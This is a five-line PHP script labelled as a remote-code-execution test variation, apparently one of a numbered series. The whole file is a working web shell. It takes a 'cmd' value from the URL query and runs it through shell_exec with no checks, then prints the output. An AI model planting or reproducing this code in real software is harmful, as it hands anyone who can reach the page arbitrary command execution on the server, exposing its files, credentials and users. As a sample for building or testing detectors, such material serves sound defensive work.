<?php
// RCE test variation #1310
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>